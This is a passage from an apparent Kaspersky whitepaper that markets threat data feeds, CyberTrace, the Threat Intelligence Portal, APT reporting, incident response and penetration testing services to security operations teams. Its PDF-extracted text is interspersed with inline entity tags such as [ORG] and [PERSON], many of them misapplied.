here are some things to bear in mind when doing so:\u2022 Look for intelligence with global reach . Attacks have no borders - an attack targeting a company in [LOC] Latin [LOC] America can be initiated from [LOC] Europe and vice versa . Does the vendor source information globally and collate seeming disjoined activities into cohesive campaigns ? This kind of intelligence will help you to take appropriate action.15\u2022\u2022If you are looking for more strategic content to inform your long - term security planning , like : \u2022 High - level view of attack trends \u2022 Techniques and methods used by attackers then look for a threat intelligence provider with a proven track record of continuously uncovering and investigating complex threats in your region or industry . The ability of the provider to tailor its research capabilities to the specifics of your company is also critical.\u2022 [ORG] Context makes intelligence from data . Threat indicators without context are of no value -you should look for providers that help you to answer the important \u2018 why does this matter ? \u2019 questions . Relationship context ( e.g. domains associated with the detected [ORG] IP addresses or URLs where the specific file was downloaded from ) provides additional value , boosting incident investigation and supporting better incident \u2018 scoping \u2019 through uncovering newly acquired related Indicators of Compromise in the network . It \u2019s assumed that your company already has some security controls in place , with the associated processes defined , and that it \u2019s important for you to use threat intelligence with the tools you already use and know . So look for delivery methods , integration mechanisms and formats that support smooth integration of threat intelligence into your existing security operations . Service highlights\u2022 Data [NORP] Feeds are automatically generatedin real time , based on findings across the globe ( [ORG] Kaspersky [ORG] Security [ORG] Network provides visibility to a significant percentage of all internet traffic , covering [MONEY] tens [MONEY] of [MONEY] millions of end - users in [CARDINAL] more [CARDINAL] than [CARDINAL] 200 countries ) providing high detection rates and accuracy.\u2022 Every record in each [ORG] Data [ORG] Feed isenriched with actionable context ( threat names , timestamps , geolocation , resolved IPs addresses of infected web resources , hashes , popularity etc . ) . Contextual data helps reveal the \u2018 bigger picture \u2019 , further validating and supporting wide - ranging use of the data . Set in context , the data can more readily be used to answer the who , what , where , when questions which lead to identifying your adversaries , helping you to make timely decisions and take the actions which will specifically safeguard your organization.\u2022 Simple lightweight dissemination formats(JSON , [ORG] CSV , OpenIoC , STIX ) via HTTPS or ad - hoc delivery mechanisms support the easy integration of feeds into security solutions.\u2022 [ORG] Threat [ORG] Intelligence is generated and monitored by a highly fault - tolerant infrastructure , ensuring continuous availability and consistent performance.\u2022 Out - of - the - box integration with HPArcSight , [ORG] IBM [PRODUCT] QRadar , Splunk and more . Kaspersky offers : Threat Data Feeds Kaspersky offers continuously updated [ORG] Threat [ORG] Data Feeds to inform your SOC team about risks and implications associated with cyberthreats , helping you to mitigate threats more effectively and to defend against attacks even before they are launched . Feed description \u2022 IP Reputation Feed \u2014 a set of [ORG] IP addresses with context covering suspiciousand malicious hosts.\u2022 Malicious URLs \u2014 a set of URLs covering malicious links and websites . Maskedand non - masked records are available.\u2022 Phishing URLs \u2014 a set of URLs identified by [PERSON] Kaspersky as phishing sites . Maskedand non - masked records are available.\u2022 Botnet C&C URLs \u2014 a set of URLs of botnet command and control ( [ORG] C&C ) serversand related malicious objects.\u2022 [PRODUCT] Ransomware [PRODUCT] URL [PRODUCT] Feed \u2014 covering links that host ransomware objects or thatare accessed by them.\u2022 [ORG] Vulnerability [ORG] Data [ORG] Feed \u2013 a set of security vulnerabilities with related threatintelligence ( hashes of vulnerable apps / exploits , timestamps , CVEs , patches etc.).\u2022 APT IoC Feeds \u2014 covering malicious domains , hosts , malicious [ORG] IP addresses , malicious files used by adversaries to commit [ORG] APT attacks.\u2022 [ORG] Passive [ORG] DNS ( [PERSON] pDNS ) Feed \u2014 a set of records that contain the results of [ORG] DNSresolutions for domains into corresponding [ORG] IP addresses.\u2022 [ORG] IoT [ORG] URL [ORG] Feed \u2014 covering websites that were used to download malware that infectsIoT devices.\u2022 [ORG] Whitelisting [ORG] Data [ORG] Feed \u2014 a set of file hashes providing [ORDINAL] third - party solutionsand services with a systematic knowledge of legitimate software.\u2022 Malicious Hash Feed \u2014 covering the most dangerous , prevalent and emergingmalware.\u2022 Mobile Malicious Hash Feed \u2014 a set of file hashes for detecting malicious objectsthat infect mobile platforms.\u2022 P - SMS Trojan Feed \u2014 a set of [GPE] Trojan hashes with corresponding context for detecting SMS [NORP] Trojans ringing up premium charges for mobile users as well as enabling an attacker to steal , delete and respond to SMS messages.\u2022 [PERSON] Mobile [PERSON] Botnet [ORG] C&C URLs \u2014 a set of URLs with context covering mobile botnetC&C servers.16Kaspersky offers : [PERSON] Kaspersky [PERSON] CyberTrace The number of security alerts processed by [ORG] Security [ORG] Operations [ORG] Center \u2019s Tier 1 analysts every day is growing exponentially . With this amount of data being analyzed , effective alert prioritization , triage and validation becomes nearly impossible . There are too many blinking lights coming from numerous security products , leading to a significant number of alerts getting buried in the noise , and analyst burnout . SIEMs , log management and security analytics tools aggregating security data and correlating related alarms all help to reduce the number of alerts warranting additional examination , but Tier 1 specialists remain extremely overloaded . Enabling effective alert triage and analysis By integrating up - to - the - minute machine - readable threat intelligence into existing security controls , like [ORG] SIEM systems , [ORG] Security [ORG] Operation [ORG] Centers can automate the initial triage process while providing their Tier 1 specialists with enough context to immediately identify alerts that need to be investigated or escalated to Incident Response ( IR ) teams for further investigation and response . However , the continuing growth in the number of threat data feeds and available threat intelligence sources makes it difficult for organizations to determine what information is relevant for them . Threat intelligence is provided in different formats and includes a huge number of Indicators of Compromise ( IoCs ) , making it hard for SIEMs or network security controls to digest them . [PERSON] Kaspersky [PERSON] CyberTrace is a threat intelligence fusion and analysis tool enabling seamless integration of threat data feeds with [ORG] SIEM solutions to help analysts leverage threat intelligence in their existing security operations workflow more effectively . It integrates with any threat intelligence feed ( in JSON , STIX , XML and [ORG] CSV formats ) you might want to use ( threat intelligence feeds from [ORG] Kaspersky , other vendors , OSINT or your custom feeds ) , supporting out - of - the - box integration with numerous [ORG] SIEM solutions and log sources . By automatically matching the logs against threat intelligence feeds , the Kaspersky CyberTrace provides real - time \u2019 situational awareness \u2019 , allowing Tier 1 analysts to make timely and better informed decisions . Figure [CARDINAL] 12 : [PERSON] Kaspersky [PERSON] CyberTrace statisticsKaspersky [ORG] CyberTrace provides a set of instruments to operationalize threat intelligence for conducting effective alert triage and initial [ORG] response:\u2022 [ORG] Demo threat data feeds from Kaspersky and OSINT feeds are available out - of - the - box ; \u2022 [ORG] SIEM connectors for a wide range of [ORG] SIEM solutions to visualize and manage [PERSON] data\u2022 [PERSON] Feed usage statistics for measuring the effectiveness of the integrated feeds . \u2022 On - demand lookup of indicators ( hashes , [ORG] IP addresses , domains , URLs ) for in - depthabout threat detections;threat investigation\u2022 A web user interface providing data visualization , access to configuration , feedmanagement , log parsing rules , blacklists and whitelists17\u2022 Advanced filtering for feeds ( based on the context provided with each of the indicators , including threat type , geolocation , popularity , time stamps and more ) and log events ( based on custom conditions)\u2022 Export of lookup results matching data feeds to [ORG] CSV format for integration withother systems ( firewalls , network and host IDS , custom tools)\u2022 [PERSON] Bulk scanning of logs and files \u2022 [ORG] Command - line interface for Windows and Linux platforms \u2022 Stand - alone mode , where [PERSON] Kaspersky [PERSON] CyberTrace is not integrated with a [ORG] SIEM butreceives and parses the logs from various sources such as networking devices Installation in DMZ - supporting scenarios where it needs to be isolated from the Internet.\u2022The tool uses an internalized process of parsing and matching incoming data , which significantly reduces [ORG] SIEM workload . [PERSON] Kaspersky [PERSON] CyberTrace parses incoming logs and events , rapidly matches the resulting data to feeds , and generates its own alerts on threat detection . A high - level architecture of the solution integration is shown in the Figure below : SIEM aggregates logs from di(cid:31)erent network devices and IT systems and sends the events with URLs , hashes , and [ORG] IPs to the correlation service for analysisCyberTrace rapidly matches incoming events with feeds and sends the detected events to [ORG] SIEM and [ORG] CyberTrace WebRaw eventsSIEMCyberTraceInternal feedsourcesDashboardsCyberTraceTier [PRODUCT] 1 [PRODUCT] AnalystWeb4Corporate [PRODUCT] NetworkFigure [PRODUCT] 13 : [PERSON] Kaspersky [PERSON] CyberTrace integration schemeKaspersky Threat DataFeeds , commercial feeds , OSINT feeds , custom feeds \u2014 [ORG] Views events with security context and incidents based on contextKaspersky also offers a set of continuously updated threat data feeds that can be integrated with the Kaspersky CyberTrace , enabling global threat visibility , timely detection of cyberthreats , prioritization of security alerts and effective response to information security incidents:\u2022IP reputation feed \u2013 a set of [ORG] IP addresses with context covering different categories of suspicious and malicious hosts;\u2022 Malicious and phishing URL feed \u2013 covering malicious and phishing links and websites ; \u2022 Botnet C&C URL feed \u2013 covering desktop botnet [ORG] C&C servers and related malicious\u2022 [GPE] Mobile botnet [ORG] C&C URL feed \u2013 covering mobile botnet [ORG] C&C servers ; \u2022 [ORG] Ransomware URL feed \u2013 covering links that host ransomware objects or that areobjects;accessed by them;\u2022 [ORG] APT [ORG] IoC feeds \u2013 covering malicious domains , hosts , malicious [ORG] IP addresses , maliciousfiles used by adversaries to commit [ORG] APT attacks;\u2022 Passive DNS ( [PERSON] pDNS ) feed \u2013 a set of records that contain the results of [ORG] DNS resolutions\u2022for domains into corresponding [ORG] IP addresses3 ; [ORG] IoT [ORG] URL feed \u2013 covering websites that were used to download malware that infects [ORG] IoT [ORG] devices4;\u2022 Malicious hash feed \u2013 covering the most dangerous , prevalent and emerging malware ; \u2022 [GPE] Mobile malicious hash feed \u2013 covering malicious objects that infect [ORG] Android and iOSmobile platforms;\u2022 P - SMS Trojan feed \u2013 covering SMS [NORP] Trojans that enable attackers to steal , delete and respond to SMS messages , as well as clocking - up premium charges for mobile users ; \u2022 [ORG] Whitelisting data feed \u2013 providing [ORDINAL] third - party solutions and services with a systematicknowledge of legitimate software.3 4Integration will be supported in [DATE] 2019 Integration will be supported in 201918Data feeds are aggregated from a combination of fused , heterogeneous and highly reliable sources , including [ORG] Kaspersky [ORG] Security [ORG] Network and its [QUANTITY] 100 + [QUANTITY] million global users who voluntarily share their data on cyberthreats with us , our own web crawlers , botnet monitoring system ( 24/7/365 monitoring of all known botnets , their targets and activities ) , spam traps , threat research teams and trusted partners . Then , in real - time , all this aggregated data is carefully inspected and refined using multiple preprocessing techniques , such as statistical criteria , [ORG] Kaspersky [ORG] Expert [ORG] Systems ( sandboxes , heuristics engines , multi - scanners , similarity tools , behavior profiling , etc . ) , analyst validation and whitelisting verification . Every record in each data feed is supplied with rich actionable context ( threat scoring , geolocation , threat names , timestamps , resolved IPs addresses of infected web resources , hashes , popularity , etc.).Figure [CARDINAL] 14 : Kaspersky Threat Data Feeds contextThis contextual data helps reveal the \u2018 bigger picture \u2019 , further validating and supporting the wide - ranging use of the data . Set in context , the data can be more readily used to answer the \u2018 who , what , where and when \u2019 questions which lead to identifying your adversaries and helping you make good decisions . Although [PERSON] Kaspersky [PERSON] CyberTrace and [ORG] Kaspersky [ORG] Threat [ORG] Data Feeds can be used separately , when used together they significantly strengthen your threat detection capabilities , empowering your security operations with global visibility into cyberthreats . With [PERSON] Kaspersky [PERSON] CyberTrace and [PERSON] Kaspersky [PERSON] Threat [PERSON] Data Feeds , Security Operations Center \u2019s analysts are able to:\u2022 Effectively distill and prioritize sweeping amounts of security alerts \u2022 \u2022Improve and accelerate triage and initial response processes Immediately identify alerts critical for the enterprise and make more informed decisions about which should be escalated to [ORG] IR teams\u2022 Form a proactive and intelligence - driven defense.19Kaspersky offers : [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Portal [ORG] ( Threat Lookup & Cloud Sandbox)KasperskyThreat IntelligencePortalAutomated Networks of sensors [PERSON] Cloud [PERSON] SandboxObjects to analyzeURLsDomainsIP addressesHasherThreat namesFilesFigure [CARDINAL] 15 : [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] PortalService [ORG] highlights\u2022 [ORG] Trusted [ORG] Intelligence : A key attribute of [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Portal is the reliability of our threat intelligence data , enriched with actionable context . Kaspersky products lead the field in anti - malware tests3 , demonstrating the unequalled quality of our security intelligence by delivering the highest detection rates , with near - zero false positives.\u2022 Threat Hunting : Be proactive inpreventing , detecting and responding to attacks , to minimize their impact and frequency . Track and aggressively eliminate attacks as early as possible . The earlier you can discover a threat \u2013 the less damage is caused , the faster repairs take place and the sooner network operations can get back to normal.\u2022 [PERSON] Sandbox [PERSON] Analysis : Detect unknownthreats by running suspicious objects in a secure environment , and review the full scope of threat behavior and artifacts through easy - to - read reports.\u2022 [PERSON] Wide [PERSON] Range [PERSON] of [PERSON] Export Formats : [ORG] ExportIOCs ( Indicators of Compromise ) or actionable context into widely used and more organized machine - readable sharing formats , such as STIX , OpenIOC , [GPE] JSON , [GPE] Yara , [GPE] Snort or even [ORG] CSV , to enjoy the full benefits of [ORG] Threat [ORG] Intelligence , automate operations workflow , or integrate into security controls such as SIEMs.\u2022 Easy - to - use Web Interface or RESTfulAPI : Use the service in manual mode through a web interface ( via a web browser ) or access via a simple RESTful API.Web serviceIncident ResponseIs it malicious ? What is it exploiting ? What relationships does it have ? Are we vulnerable?Kaspersky Threat Intelligence Portal delivers all the knowledge acquired by [ORG] Kaspersky about cyberthreats and their relationships , brought together into a single , powerful web service . The goal is to provide your SOC teams with as much data as possible , preventing cyberattacks before they impact your organization . The Portal retrieves the latest detailed threat [ORG] Intelligence about URLs , domains , [ORG] IP addresses , file hashes , threat names , statistical / behavior data , WHOIS [ORG] / [ORG] DNS data , file attributes , geolocation data , download chains , timestamps , while the Cloud Sandbox allows that knowledge to be linked to the IOCs generated by the analyzed sample . The result is global visibility of new and emerging threats , helping you secure your organization and boosting incident response . Threat intelligence delivered by [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Portal is generated and monitored in real time by a highly fault - tolerant infrastructure , ensuring continuous availability and consistent performance . [CARDINAL] Hundreds of experts , including security analysts from across the globe , world - famous security experts from our [ORG] GReAT team and leading - edge R&D teams , all contribute to generating valuable real - world threat intelligence . Figure [CARDINAL] 16 : [ORG] Kaspersky [ORG] Threat [ORG] Intelligence Portal5url offers : [ORG] APT [ORG] Intelligence [ORG] Reporting Not all Advanced Persistent Threat discoveries are reported immediately , and many are never publicly announced . Be the [ORDINAL] first to receive our latest research with our exclusive , in - depth , actionable intelligence reporting on APTs . Our ResearchDuqu 2.0MetelDarkhotelNaikonCosmicDukeHellsingDarkhotel TurlaReginSofacy201420152016Careto / [ORG] The [ORG] MaskCarbanakEpic [ORG] TurlaEnergetic [ORG] Bear [ORG] / ElephantProjectSauronSaguaroStrongPityStoneDrillBlueNoro(cid:31)ExPetr [ORG] / NotPetyaShamoon 2.0WannaCrySkygofree20172018OlympicDestroyerGhoulFruity ArmorScarCruftATMitchShadowPadBlackOasisMoonlight MazeWhiteBearSilenceZooParkAs a subscriber to [ORG] Kaspersky [ORG] APT [ORG] Intelligence [ORG] Reporting , you are provided with unique ongoing access to our investigations and discoveries , including full technical data supplied in a range of formats , on each [ORG] APT revealed , including all those threats that will never be made public . Our experts , the most skilled and successful [ORG] APT hunters in the industry , will also alert you immediately to any changes they detect in the tactics of cybercriminal groups . Furthermore , you will have access to [ORG] Kaspersky \u2019s complete [ORG] APT reports database \u2013 another powerful research and analysis component of your corporate security armory . From a practical perspective , Indicators of Compromise are the most actionable part of the report for SOC experts . This structured information is provided for subsequent use with specific automated tools that help check your infrastructure for signs of infection . All reports are available via the web interface or can be accessed via RESTful API.1Figure [CARDINAL] 17 : [ORG] Kaspersky \u2019s publicly announced [ORG] APT investigationsService highlights\u2022\u2022 Exclusive access to technical descriptions of cutting - edge threats during the ongoing investigation , before public release . [CARDINAL] More [CARDINAL] than [CARDINAL] 100 [ORG] APT reports were issued in [DATE] 2017 . Insight into non - public APTs . Not all high profile threats are subject to public notification . Some , due to the victims who are impacted , the sensitivity of the data , the nature of the vulnerability fixing process or associated law enforcement activity , are never made public . But all are reported to our customers.\u2022 Detailed supporting technical data , including an extended list of Indicators of Compromise ( IOCs ) , available in openIOC format , and access to our [ORG] Yara Rules.\u2022 [PERSON] Continuous [PERSON] APT campaign monitoring . Access to actionable intelligence during the investigation ( information on [ORG] APT distribution , IOCs , [ORG] C&C infrastructure ) . \u2022 Retrospective analysis \u2013 access to allpreviously issued private reports is provided throughout the period of your subscription . Figure [CARDINAL] 18 : [ORG] APT [ORG] Intelligence Reporting21Kaspersky offers : Tailored Threat Intelligence ReportingCustomer - specific Threat Intelligence Reporting What \u2019s the best way to mount an attack against your organization ? Which routes , and what information , are available to an attacker specifically targeting you ? Has an attack already been mounted , or are you about to come under threat?Kaspersky Customer - specific [ORG] Threat [ORG] Reporting answers these questions and more , as our experts piece together a comprehensive picture of your current attack status , identifying weak spots ripe for exploitation and revealing evidence of past , present and planned attacks . Empowered by these unique insights , you can focus your defense strategy on areas pinpointed as cybercriminals \u2019 prime targets , acting quickly and with precision to repel intruders and minimize the risk of a successful attack . Developed using open source intelligence ( OSINT ) , deep analysis of [ORG] Kaspersky expert systems and databases and our knowledge of underground cybercriminal networks , these reports cover areas including:\u2022Identification of threat vectors : Identification and status analysis of externally available critical components of your network \u2013 including ATMs , video surveillance and other systems using mobile technologies , employee social network profiles and personal email accounts \u2013 that are potential targets for attack;\u2022 [PERSON] Malware and cyberattack tracking analysis : Identification , monitoring and analysisof any active or inactive malware samples targeting your organization , any past or present botnet activity and any suspicious network based activity;\u2022 [ORDINAL] Third - party attacks : Evidence of threats and botnet activity specifically targeting yourcustomers , partners and subscribers , whose infected systems could then be used to attack [DATE] you;\u2022Information leakage : through discreet monitoring of underground online forums and communities , we discover whether hackers are discussing attack plans with you in mind or , for example , if an unscrupulous employee is trading information;\u2022 Current attack status : [ORG] APT attacks can continue undetected for [DATE] many [DATE] years . If we detect a current attack affecting your infrastructure , we provide advice on effective remediation . Quick start \u2013 easy to use \u2013 no resources needed Once parameters ( for customer - specific reports ) and preferred data formats are established , no additional infrastructure is needed to start using this Kaspersky service . [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Reporting has no impact on the integrity and availability of resources , including network resources . Country - specific Threat Intelligence Reporting The cybersecurity of a country includes protection of all its major institutions and organizations . Advanced persistent threats ( APTs ) against government authorities can affect national security ; possible cyberattacks against manufacturing , transportation , telecommunication , banking and other pivotal industries can lead to significant damage on the state level , like financial losses , production accidents , blockage of network communications , and popular discontent . Having an overview of the current attack surface and the current trends in malware and hacker attacks targeting your country , you can focus your defense strategy on areas pinpointed as cybercriminals \u2019 prime targets , acting fast and with precision to repel intruders and minimize the risk of successful attacks . Created using approaches ranging from [ORG] Open [ORG] Source [ORG] Intelligence [ORG] ( [ORG] OSINT ) to deep analysis of [ORG] Kaspersky expert systems and databases , and our knowledge of the underground cybercriminal networks , country - specific threat reports cover areas including:\u2022 Identification of threat vectors : identification and status analysis of externallyavailable critical IT resources of the country \u2013 including vulnerable government applications , telecommunication equipment , industrial control systems \u2019 components ( such as [ORG] SCADA , PLCs , etc . ) , ATMs , etc.22\u2022 Malware and cyberattack tracking analysis : identification and analysis of [ORG] APTcampaigns , active or inactive malware samples , past or present botnet activity , and other notable threats targeting your country , based on data available in our unique internal monitoring resources.\u2022 Information leakages : through clandestine monitoring of underground forums andonline communities , we discover whether hackers are discussing attack plans with certain organizations in mind . We also reveal notable compromised accounts , which could pose risks to suffered organizations and institutions ( for instance , accounts belonging to government agencies \u2019 employees available in the [PERSON] Ashley [PERSON] Madison breach , which could be used for blackmailing).Kaspersky Threat Intelligence Reporting has no impact on the integrity and availability of the network resources being inspected . The service is based on non - intrusive network reconnaissance methods , and analysis of information available in open sources and resources of limited access . At the conclusion of the service you will be provided with a report containing a description of notable threats for different state industries and institutions , as well as additional information on detailed technical analysis results . Reports are delivered via encrypted email messages . The service can be provided as a [CARDINAL] one - time project or periodically under subscription ( for example , quarterly).More about [ORG] Kaspersky [ORG] Threat [ORG] Intelligence [ORG] Sources [ORG] Threat [ORG] Intelligence is aggregated from a fusion of heterogeneous and highly reliable sources , including [ORG] the [ORG] Kaspersky [ORG] Security [ORG] Network ( [ORG] KSN ) and our own web crawlers , our Botnet Monitoring service ( 24/7/365 monitoring of botnets and their targets and activities ) , spam traps , research teams , partners and other historical data about malicious objects collected by [ORG] Kaspersky over [DATE] almost [DATE] two [DATE] decades . Then , in real time , all aggregated data is carefully inspected and refined using multiple preprocessing techniques , such as statistical criteria , [ORG] Kaspersky [ORG] Expert [ORG] Systems ( sandboxes , heuristics engines , similarity tools , behavior profiling etc . ) , analyst validation and whitelisting verification . With appropriately skilled and trained people in place , and [ORG] Threat [ORG] Intelligence acquired from reliable sources and implemented into existing security controls , it \u2019s time to consider your Incident Response . [ORG] CustomerKasperskyGlobal Users1KSN3Web [ORG] CrawlersBotnet [ORG] MonitoringSpam [ORG] TrapsSensorsAPT Research TeamSecurity Operations CentersIncident Response PracticePartnersOSINTFigure [CARDINAL] 19 : [ORG] Kaspersky \u2019s [ORG] Threat [ORG] Intelligence AnalystsWhitelisting23Threat HuntingThreat hunting is also an important element of everyday SOC operations . This is not a new concept . The detection of unknown and advanced threats relies on the painstaking , hands - on efforts of security analysts , rather than automated rules or signature - based detection mechanisms . Modern attacks take the protection tools available to their victims into consideration and are developed accordingly , bypassing automatic detection and prevention systems . These kinds of attacks are often carried out without any software being used , and the attackers \u2019 actions are barely distinguishable from those that IT or information security officers would perform . The following are just some of the techniques used in modern - [DATE] day attacks:\u2022 The use of tools to hamper digital forensics , e.g. by securely deleting artifactson the hard drive or by implementing attacks solely within a computer \u2019s memory;\u2022 The use of legitimate tools that IT and information security departments routinely use ; \u2022 Multi - stage attacks , when traces of preceding stages are securely deleted ; \u2022Interactive work by a professional team ( similar to that used during penetration testing).This sort of attack can only be detected after the target asset has been compromised , as only then can suspicious behavior indicative of malicious activity be detected . Threat hunting can detect attacks after the initial breach has taken place . A key element is the involvement of a professional analyst at the final stage of decision making . A human presence within the event analysis chain helps compensate for the weaknesses of automatic threat detection logic . Moreover , when pentest - like attacks involve a human on the attacking side , that human undoubtedly has an advantage when it comes to bypassing automatic technologies , so the presence of a human analyst is the only way to withstand such attacks . But neither automated threat detection and prevention tools nor cyberthreat hunting alone is a silver bullet for the entire modern spectrum of threats . A combination of traditional detection and prevention tools active before a compromise occurs , plus a post - compromise iterative process of searching for new threats missed by automated tools , can be effective . Kaspersky offers : [ORG] Kaspersky [ORG] Managed [ORG] Protection The Kaspersky Managed Protection service offers [ORG] Kaspersky [ORG] Endpoint [ORG] Security and [PERSON] Kaspersky [PERSON] Anti [PERSON] Targeted Attack Platform users a fully managed service , deploying a unique range of advanced technical measures to detect and prevent targeted attacks on your organization . The service includes round - the - clock monitoring by [PERSON] Kaspersky experts and the continuous analysis of cyberthreat data , ensuring the real - time detection of both known and new cyberespionage and cybercriminal campaigns targeting critical information systems . KasperskyMonitoring CenterTargetInfrastructure??KasperskySecurity Network*Figure [CARDINAL] 20 : [PERSON] Kaspersky [PERSON] Managed Protection*Kaspersky Private Security Network for isolated [ORG] InfrastructuresService highlights\u2022 A continuously high level of protection against targeted attacks and malware , with [CARDINAL] 24x7 monitoring and support from your own \u2018 crack team \u2019 of Kaspersky experts , drawing on a deep pool of specialist skills and ongoing threat intelligence.\u2022 The timely and accurate detection ofnon - malware attacks , attacks involving previously unknown tools and attacks exploiting zero - [DATE] day vulnerabilities . Immediate protection against any detected threat through automatic antivirus database updates.\u2022\u2022 Retrospective analysis of incidents andthreat hunting , including the methods and technologies used by threat actors against your organization.\u2022 An integrated approach \u2013 the [PERSON] Kasperskyportfolio includes all the technologies and services you need to implement a complete cycle of protection against targeted attacks : Preparation \u2013 Detection \u2013 Investigation \u2013 Data Analysis \u2013 Automated Protection . Service benefits \u2022 Fast , efficient detection , enabling faster and more effective mitigation and remediation . \u2022 No time - wasting false positives , thanks to the clear , immediate identification andclassification of any suspicious activity.\u2022 Reduced overall security costs . No need to employ and train a range of different in - housespecialists you may need.\u2022\u2022 The reassurance of knowing that you are continuously protected against even the mostcomplex and innovative non - malware threats . Insights into attackers , their motivation , their methods and tools , and the potential damage they could inflict , supporting the development of your fully informed , effective protection strategy.24Incident Investigation and [ORG] ResponseForensics and incident response requires the allocation of considerable internal resources at little or no notice . Knowledgeable specialists , armed with extensive practical experience of fighting cyberthreats , will need to act quickly to identify , isolate and block malicious activity . Speed is of the essence , if consequences and remediation costs are to be minimized . Mastering this level of expertise at short notice can be challenging , even for a well- established SOC team \u2013 few organizations have sufficient in - house resources on hand to stop an advanced attack in its tracks . Additionally , there may be cases , e.g. complex state - sponsored threats or APTs , where the SOC Team lacks expert knowledge of the specific approaches and tactics used by the [ORG] APT actors involved . In cases like these , it may be more cost - effective and productive to collaborate with a [ORDINAL] third - party Incident Response vendor or consultancy , who will be geared up to applying a rapid , fully - informed response . A comprehensive Incident Response Framework should include:\u2022 Incident [ORG] IdentificationInitial incident analysis and isolation of the infected systems\u2022 Evidence acquisitionDepending on the type of the incident , different sources will need to be inspected to obtain the necessary [ORG] evidence\u2022 [ORG] Forensic [ORG] Analysis ( if required)At this stage , a detailed picture of the incident can be established\u2022 [PERSON] Malware [PERSON] Analysis ( if required)To gain an understanding of given malware capabilities\u2022 Remediation PlanDevelopment of a plan to eradicate both the root cause of the problem and all traces of the malicious code\u2022 Lessons learnedExisting security controls review and update to prevent similar incidentsPreparationIdenti\ufb01cationIsolationAcquisitionExaminationRemediationLesson [LAW] LearnedFigure [LAW] 21 : Incident Response FrameworkKaspersky offers : Incident Response Services Incident Response is our premium service , covering the entire incident investigation cycle , from the onsite acquisition of evidence to the identification of additional indications of compromise , preparing a remediation plan and completely eliminating the threat to your organization . Kaspersky \u2019s investigations are carried out by highly experienced Cyber- Intrusion Detection Analysts and Investigators . The full weight of our global expertise in [ORG] Digital [ORG] Forensics and [PERSON] Malware [PERSON] Analysis can be brought to bear on the resolution of your security incident . The following objectives are to be achieved during execution of the service : Identifying compromised resources ; Isolating the threat;\u2022 \u2022 \u2022 Preventing the attack from spreading ; \u2022 Finding and gathering evidence ; \u2022 Analyzing the evidence and reconstructing the incident \u2019s chronology and logic ; \u2022 Analyzing the malware used in the attack ( if any malware is found ) ; \u2022 Uncovering the sources of the attack and other potentially compromised systems\u2022 Conducting tool - aided scans of your IT infrastructure to reveal possible signs(if possible);of compromise;\u2022 Analyzing outgoing connections between your network and external resources to detectanything suspicious ( such as possible command and control servers);\u2022 Eliminating the threat ; \u2022 Recommending further remedial action you can take.25Depending on whether or not you have your own incident response team , you can ask our experts to execute the complete investigation cycle , to simply identify and isolate compromised machines and prevent dissemination of the threat , or to conduct [PERSON] Malware [PERSON] Analysis or [ORG] Digital [ORG] Forensics . [PERSON] Malware [PERSON] Analysis [PERSON] Malware [PERSON] Analysis offers a complete understanding of the behavior and objectives of the specific malware files that are targeting your organization . [ORG] Kaspersky \u2019s experts carry out a thorough analysis of the malware sample you provide , creating a detailed report that includes:\u2022 [GPE] Sample properties : A short description of the sample and a verdict on its malwareclassification;\u2022 Detailed malware description : An in - depth analysis of your malware sample \u2019s functions , threat behavior and objectives \u2013 including IOCs \u2013 arming you with the information required to neutralize its activities;\u2022 Remediation scenario : The report will suggest steps to fully secure your organizationagainst this type of threat . [ORG] Digital [ORG] Forensics [ORG] Digital [ORG] Forensics can include malware analysis as above , if any malware was discovered during the investigation . Kaspersky experts piece together the evidence to understand exactly what \u2019s going on , including the use of [ORG] HDD images , memory dumps and network traces . The result is a detailed explanation of the incident . You as the customer initiate the process by gathering evidence and providing an outline of the incident . Kaspersky experts analyze the incident symptoms , identify the malware binary ( if any ) and conduct the malware analysis in order to provide a detailed report including remediation steps . Delivery options [ORG] Kaspersky \u2019s Incident Response Services are available:\u2022 By subscription \u2022In response to a single incidentBoth options are based on the amount of time our experts spend to resolving the incident . This is negotiated with the customer prior signing the contract . [ORG] Customer may flexibly include [TIME] as [TIME] much [TIME] working [TIME] hours as he thinks are necessary or follow our experts \u2019 recommendations tailored to each specific case.26Penetration Testing and Red TeamingEnsuring that your IT infrastructure is fully secured against cyberattacks is an ongoing challenge for any organization , but even more so for large enterprises with [CARDINAL] thousands of employees , [CARDINAL] hundreds of IT systems , and multiple locations worldwide . To improve your security stance , experts recommend paying special attention to web application security , timely updates of vulnerable software , password protection and firewalling rules . It \u2019s also very important to run regular security assessments for your IT infrastructure ( including applications).Completely preventing information resources being compromised can be extremely difficult in large networks or even impossible when attacks are launched using zero - [DATE] day vulnerabilities . For this reason , it \u2019s critical to do everything you can to ensure that information security incidents are detected as early as possible . Timely detection of threat actor activities at the early stages of an attack and a prompt response may help prevent any damage from being caused - or substantially mitigate it . Mature organizations with well - established processes in place for security assessments , vulnerability management and detection of information security incidents should consider running [ORG] Red [ORG] Teaming - type tests . These tests determine how well infrastructures are protected against highly skilled attackers operating with maximum stealth , and help train the IT security team to identify attacks and react to them in real - world conditions . Kaspersky offers : Penetration Testing Kaspersky \u2019s Penetration Testing gives you a greater understanding of the security flaws in your infrastructure , revealing vulnerabilities , analyzing the possible consequences of different forms of attack , evaluating the effectiveness of your current security measures and suggesting remedial actions and improvements . Penetration Testing from Kaspersky helps you and your organization to:\u2022Identify the weakest points in your network , so you can make fully informed decisions about where best to focus your attention and budget to mitigate future risk.\u2022 Avoid financial , operational and reputational losses caused by cyberattacks bypreventing these attacks from happening , through proactively detecting and fixing vulnerabilities.\u2022 Comply with government , industry or internal corporate standards that require thisform of security assessment ( for example , [ORG] Payment [ORG] Card [ORG] Industry [ORG] Data [ORG] Security [ORG] Standard ( PCI DSS)).Service scope and options Depending on your needs and your IT infrastructure , you may choose any or all of these services:\u2022 External penetration testing : A security assessment conducted through the Internetby an \u2018 attacker \u2019 with no preliminary knowledge of your system . Internal penetration testing : Scenarios based on an internal attacker , such as a visitor with only physical access to your offices or a contractor with limited systems access . \u2022 Social engineering testing : An assessment of security awareness among your personnel\u2022by emulating social engineering attacks such as phishing , pseudo - malicious links in emails , suspicious attachments , etc.\u2022 [ORG] Wireless networks security assessment : Our experts visit your site and analyze yourWiFi security controls . You can include any part of your IT infrastructure in the scope of penetration testing , although we strongly recommend you include the whole network or at least its largest segments , as test results are always more worthwhile when our experts are working under the same conditions as a potential 